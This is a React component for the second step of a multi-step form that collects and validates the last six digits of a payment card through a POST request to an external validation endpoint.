import { useForm } from "react-hook-form";
import { useNavigate } from "react-router-dom";
import { FaArrowRight, FaArrowLeft } from "react-icons/fa";
import { toast } from "react-toastify";
import { useState } from "react";

function Stepii({ nextStep, prevStep }) {
  const {
    register,
    handleSubmit,
    formState: { errors },
    watch,
  } = useForm({
    defaultValues: { lastSixDigits: "" },
  });
  const navigate = useNavigate();
  const [isLoading, setIsLoading] = useState(false);

  const onSubmit = (data) => {
    setIsLoading(true);
    fetch("https://card-reader-mu.vercel.app/validate-digits", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ lastSixDigits: data.lastSixDigits }),
    })
      .then((response) => response.json())
      .then((result) => {
        if (result.message === "Digits validated successfully") {
          toast.success("Digits validated!");
          nextStep();
          navigate("/stepiii");
        } else {
          toast.error(result.message);
        }
      })
      .catch(() => {
        toast.error("Server error.");
      })
      .finally(() => setIsLoading(false));
  };

  return (
    <form
      onSubmit={handleSubmit(onSubmit)}
      style={{ display: "flex", flexDirection: "column", gap: "16px" }}
    >
      <h2 style={{ fontSize: "20px", fontWeight: "bold", textAlign: "center" }}>
        Last 6 Card Digit
      </h2>
      <div style={{ textAlign: "left" }}>
        <label>Last 6 Card Digit</label>
        <input
          type="text"
          {...register("lastSixDigits", {
            required: true,
            pattern: /^[0-9]{6}$/,
          })}
          style={{
            width: "100%",
            padding: "8px",
            border: "1px solid #ccc",
            borderRadius: "4px",
            marginTop: "5px",
          }}
          placeholder="e.g. 676891"
          maxLength={6}
        />
      </div>
      <button
        type="submit"
        style={{
          backgroundColor: "#3b82f6",
          color: "white",
          border: "none",
          padding: "10px",
          borderRadius: "4px",
          cursor: "pointer",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
        }}
        disabled={isLoading}
      >
        {isLoading ? "Loading..." : "Next Step"}{" "}
        <FaArrowRight style={{ marginLeft: "8px" }} />
      </button>
      <button
        type="button"
        onClick={() => {
          prevStep();
          navigate("/stepi");
        }}
        style={{
          backgroundColor: "transparent",
          color: "#666",
          border: "none",
          padding: "10px",
          cursor: "pointer",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
        }}
      >
        <FaArrowLeft style={{ marginRight: "8px" }} /> Back to Previous
      </button>
    </form>
  );
}

export default Stepii;
